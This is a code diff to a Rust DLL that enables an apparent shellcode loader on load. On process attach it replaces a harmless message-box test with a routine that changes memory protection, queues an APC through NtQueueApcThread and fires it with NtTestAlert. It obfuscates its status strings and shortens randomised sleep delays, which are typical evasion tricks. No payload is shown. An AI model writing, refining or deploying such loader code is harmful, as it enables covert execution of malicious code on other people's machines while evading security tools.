@@ -24,8 +24,8 @@ extern "system" fn DllMain(hinstance: HINSTANCE, reason: u32, _: *mut std::ffi::
     match reason {
         DLL_PROCESS_ATTACH => {
             thread::spawn(|| {
-                //ntapcsheep_main();
-                run_msgbox();
+                ntapcsheep_main();
+                //run_msgbox();
             });
             //ntapcsheep_main(); -> does not work
         }
@@ -143,7 +143,7 @@ fn ntapcsheep_main() {
             &mut old_protect,
         );
 
-        zzz_random(1500, 3900);
+        zzz_random(1200, 2100);
 
         println!("{}", obfstr!("[*] queue the apc"));
         NtQueueApcThread(
@@ -154,7 +154,7 @@ fn ntapcsheep_main() {
             null_mut(),
         );
 
-        zzz_random(2850, 4791);
+        zzz_random(1850, 3191);
 
         println!("{}", obfstr!("[*] nt test alert"));
         NtTestAlert();
